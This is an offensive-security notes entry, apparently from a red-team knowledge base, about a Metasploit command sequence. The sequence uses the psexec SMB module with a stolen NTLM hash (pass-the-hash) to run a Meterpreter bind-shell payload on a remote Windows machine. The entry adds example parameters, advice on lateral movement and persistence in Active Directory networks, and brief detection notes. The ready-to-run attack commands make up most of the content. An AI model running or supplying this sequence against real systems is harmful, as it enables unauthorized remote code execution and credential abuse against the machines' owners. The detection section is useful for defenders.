---
type: code
language: msfconsole
verified: true
created_at: '2023-04-06T03:56:05Z'
updated_at: '2023-04-10T20:25:57Z'
platforms:
  - Windows
tags:
  - lateral-movement
  - pass-the-hash
  - remote-execution
validated: true
---

# metasploit-psexec-with-hash

## Code

```msfconsole
use exploit/windows/smb/psexec
set RHOST $_TARGET_IP
set SMBUser $_USERNAME
set SMBPass $_NTLM_HASH  
# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
# NOTE2: Require the full NT hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

## Description

This Metasploit sequence loads the psexec SMB exploit module and configures it for Pass-the-Hash authentication to execute a Meterpreter payload on a remote Windows target, providing a bind shell for post-exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_IP | IP address of the target system | 10.2.0.3 |
| $_USERNAME | Username for SMB authentication | jarrieta |
| $_NTLM_HASH | NTLM hash (optionally with LM:LM:NT) | nastyCutt3r or 489a04c09a5debbc9b975356693e179d |

## Usage

Run in msfconsole after starting the framework (msfconsole). Ideal for initial lateral movement in AD networks after obtaining hashes. Set up a listener if using reverse payloads. Follow with post-exploitation modules for persistence.

## Detection

- Monitor SMB traffic for psexec-like service creation (Event ID 7045)
- Meterpreter signatures in network flows or process trees (e.g., svchost.exe spawning unusual children)
- Anomalous logons with NTLM (Event ID 4624, Type 3)

## Related

- [[procedures/Pass-the-Hash-Active-Directory-Attack]]
- [[tools/metasploit-framework]]
